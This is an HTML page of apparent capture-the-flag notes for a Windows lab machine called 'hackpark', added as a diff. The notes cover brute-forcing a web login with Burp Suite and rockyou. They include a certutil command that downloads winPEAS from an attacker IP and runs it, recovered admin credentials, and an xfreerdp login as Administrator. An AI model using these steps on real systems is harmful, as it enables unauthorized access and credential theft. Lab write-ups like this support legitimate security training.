@@ -1,0 +1,49 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>hackpark</title>
+</head><body><img src="image.png"/><br/>
+<br/>
+<br/>
+Brute Force inside burpsuite // they want a hydra brute force but burp was way simpler<ul><li style="list-style-type: none">used sniper and pasted raw file of rockyou into payload bar</li>
+</ul>
+Login for website:<ul><li style="list-style-type: none">admin : 1qaz2wsx</li>
+<li style="list-style-type: none"/>
+</ul>
+<img height="684" src="image 2.png" width="750"/><br/>
+<img src="image 3.png"/><br/>
+<br/>
+<span style="font-size: 18pt">upload winpeasx64.exe<br/>
+<br/>
+<span style="font-size: 14pt">&gt;certutil -urlcache -f http://10.13.17.108:9090/winPEASx64.exe winPEAS.exe<br/>
+&gt; winPEAS.exe<br/>
+</span>WinPeas has a lot to show, but the easiest thing we found was the admin username and password<br/>
+<img src="image 4.png"/><br/>
+<br/>
+<span style="font-size: 14pt">administrator : 4q6XvFES7Fdxs<br/>
+</span><br/>
+So we know port 3389 is running (Windows Remote Desktop)<br/>
+so lets connect<br/>
+</span><span style="font-size: 16pt">kali&gt; xfreerdp /u:Administrator /p:4q6XvFES7Fdxs /v:10.10.68.125</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt">Now you are signed in as Admin, get user and root flag<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</span></body></html>
